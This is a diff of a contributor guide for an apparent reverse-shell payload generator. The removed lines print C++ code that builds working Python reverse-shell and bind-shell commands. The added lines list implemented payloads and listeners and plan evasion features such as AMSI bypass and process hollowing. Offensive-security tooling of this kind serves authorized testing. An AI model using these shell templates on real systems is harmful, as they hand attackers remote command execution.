@@ -100,35 +100,34 @@ PayloadFactory::PayloadFactory() {
 }
 ```
 
-### Step 4: Add Platform-Specific Generation
+### Step 4: Update CMake Build Configuration
 
-Extend the platform-specific methods in `PayloadFactory.cpp`:
+Add your new payload files to the appropriate CMakeLists.txt:
+
+```cmake
+# In src/payloads/CMakeLists.txt
+set(PAYLOAD_SOURCES
+    PayloadFactory.cpp
+    implementations/Python_Payload.cpp
+    # Add other existing implementations...
+)
+
+# In src/listeners/CMakeLists.txt  
+set(LISTENER_SOURCES
+    # Header-only implementations, add if needed
+)
+```
+
+### Step 5: Add to Factory Registration
+
+The PayloadFactory uses a registry pattern. Add your payload to the factory constructor:
 
 ```cpp
-std::string PayloadFactory::generateLinuxPayload(const Options& opts) const {
-    // Add Python case
-    if (opts.interpreter == "python" || opts.interpreter == "python3") {
-        return generatePythonPayload(opts);
-    }
-    
-    // Existing switch statement...
+// In PayloadFactory constructor
+PayloadFactory::PayloadFactory() {
+    // Existing registrations for 25+ payload types...
+    registry_["python"] = std::make_unique<PythonPayload>();
 }
-
-std::string PayloadFactory::generatePythonPayload(const Options& opts) const {
-    std::string python = opts.interpreter.empty() ? "python" : opts.interpreter;
-    
-    switch (opts.payloadType) {
-        case PayloadType::REVERSE:
-            return python + " -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + 
-                   opts.host + "\"," + std::to_string(opts.port) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
-        case PayloadType::BIND:
-            return python + " -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\"," + 
-                   std::to_string(opts.port) + "));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
-        // Add other cases...
-    }
-    return "";
-}
-```
 
 ## Adding New Listeners
 
@@ -448,15 +447,40 @@ bool isValidShell(std::string_view shell);
 - [ ] Cross-platform compatibility tested
 - [ ] Security considerations addressed
 
+## Current Implementation Status
+
+The project currently includes:
+
+### Implemented Payloads (25+)
+- **Bash variants**: Interactive (`bash -i`), /dev/tcp, readline, UDP
+- **C implementations**: Linux C, Windows C, C# variants  
+- **Scripting languages**: PHP (PentestMonkey/Ivan), Perl (multiple variants)
+- **Network tools**: Multiple netcat variants, Ncat implementations, Rustcat
+- **Encrypted shells**: OpenSSL, TLS-enabled connections
+- **Specialized**: curl-based, Haskell, BusyBox variants
+
+### Implemented Listeners (17+)
+- **Netcat variants**: Standard nc, BusyBox nc, FreeBSD nc
+- **Enhanced tools**: Ncat, Ncat with TLS, pwncat, rustcat  
+- **Advanced listeners**: socat, socat with TTY, OpenSSL
+- **Framework integration**: Metasploit handler, Hoaxshell
+- **Windows support**: ConPTY, PowerCat, Windows-specific variants
+
+### Supported Features
+- **Multi-platform**: Linux, Windows, macOS payload generation
+- **Encoding**: Base64, URL encoding, double URL encoding
+- **Interfaces**: Both CLI and Qt6 GUI applications
+- **Extensible architecture**: Factory pattern for easy additions
+
 ## Future Enhancements
 
 Potential areas for contribution:
 
-1. **New Payload Types**: PHP, Ruby, Perl, Go, Rust shells
-2. **Advanced Encodings**: AES encryption, custom obfuscation
-3. **GUI Interface**: Qt or web-based interface
-4. **Network Protocols**: HTTP, HTTPS, DNS tunneling
-5. **Evasion Techniques**: Anti-detection, process injection
-6. **Configuration Files**: JSON/YAML configuration support
+1. **New Payload Types**: Python, Ruby, Go, additional language implementations
+2. **Advanced Encodings**: AES encryption, XOR, custom obfuscation methods
+3. **Network Protocols**: HTTP/HTTPS tunneling, DNS exfiltration, WebSocket shells
+4. **Evasion Techniques**: Anti-AV, AMSI bypass, process hollowing
+5. **Configuration Management**: JSON/YAML profiles, saved configurations
+6. **Automation Features**: Batch payload generation, testing frameworks
 
-Remember to always consider the ethical implications and ensure your contributions align with the project's responsible use guidelines.
+⚠️ **Ethical Use Reminder**: All contributions must align with responsible disclosure and authorized testing guidelines. This tool is designed for educational and legitimate security testing purposes only.
